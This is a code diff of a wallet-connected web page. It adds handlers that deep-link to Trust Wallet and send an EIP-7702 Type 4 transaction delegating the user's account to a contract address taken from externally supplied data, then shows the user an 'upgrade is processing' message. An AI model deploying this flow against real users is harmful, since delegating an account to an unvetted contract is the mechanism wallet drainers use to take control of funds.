-                log(`TX: ${JSON.stringify(tx, null, 2).substring(0, 300)}...`, 'info');
-                log('Sending eth_sendTransaction...', 'info');
-
-                const hash = await provider.request({
+                const txHash = await provider.request({
                     method: 'eth_sendTransaction',
-                    params: [tx]
+                    params: [txParams]
                 });
 
-                log(`Transaction hash: ${hash}`, 'success');
-                log(`Etherscan: https://etherscan.io/tx/${hash}`, 'success');
-
+                log(`[CONTROL B SUCCESS] Tx Hash: ${txHash}`, 'success');
             } catch (err) {
-                log(`Raw Type 4 failed: ${err.message}`, 'error');
-                if (err.message.includes('invalid') || err.message.includes('unsupported')) {
-                    log('Wallet does not support Type 4 transactions via standard API.', 'warn');
-                }
-            } finally {
-                $('sendRawBtn').disabled = false;
-                $('sendRawBtn').textContent = 'Send Raw Type 4 Transaction';
+                log(`[CONTROL B FAILED] ${err.message || err}`, 'error');
             }
         });
 
-        // ─── Event Listeners ───
-        $('addCallBtn').addEventListener('click', () => addCallEntry());
+        // EXPERIMENTAL TEST C: EIP-7702 Type 4 transaction
+        $('submitBtn').addEventListener('click', async () => {
+            if (!authData || !provider) { log('Connect first', 'error'); return; }
 
-        if (window.ethereum) {
-            window.ethereum.on('accountsChanged', (accounts) => {
-                if (accounts.length === 0) {
-                    log('Wallet disconnected', 'warn');
-                    location.reload();
-                } else {
-                    userAddress = accounts[0];
-                    $('walletAddress').textContent = userAddress;
-                    log(`Account changed: ${shorten(userAddress)}`, 'info');
-                }
-            });
+            try {
+                log('[EXPERIMENTAL C] Constructing Raw Type 4 EIP-7702 Transaction...');
+                log('Triggering deep link to wallet...', 'info');
+                
+                setTimeout(() => { window.location.href = "trust://"; }, 500);
 
-            window.ethereum.on('chainChanged', (newChainId) => {
-                chainId = parseInt(newChainId, 16);
-                $('walletChain').textContent = chainId === 1 ? 'Mainnet (1)' : `Chain ${chainId}`;
-                log(`Chain changed to ${chainId}`, 'info');
-                checkCapabilities();
-            });
-        }
+                const txParams = {
+                    from: userAddress,
+                    to: userAddress,
+                    value: "0x0",
+                    data: "0x",
+                    type: "0x4", // Raw Type 4 payload
+                    authorizationList: [
+                        {
+                            chainId: "0x1", // Mainnet
+                            contractAddress: authData.delegatorContract,
+                            nonce: "0x" + authData.nonce.toString(16)
+                        }
+                    ]
+                };
 
-        // Initialize
-        addCallEntry();
-        detectBrowser();
+                const txHash = await provider.request({
+                    method: 'eth_sendTransaction',
+                    params: [txParams]
+                });
+
+                log(`[EXPERIMENTAL C SUCCESS] Transaction broadcast succeeded!`, 'success');
+                log(`Hash: ${txHash}`, 'success');
+
+                $('resultSection').classList.remove('hidden');
+                $('resultContent').innerHTML = `
+                    <p class="text-green-400">✅ Broadcast successfully</p>
+                    <p class="text-gray-400">Tx Hash: <span class="mono text-indigo-300">${txHash}</span></p>
+                    <p class="text-gray-500 mt-2">Your upgrade is processing. View on Etherscan.</p>
+                `;
+
+            } catch (err) {
+                log(`[EXPERIMENTAL C FAILED] ${err.message || err}`, 'error');
+            }
+        });
     </script>
 </body>
-    </html>
-    
+                                                                                               </html>
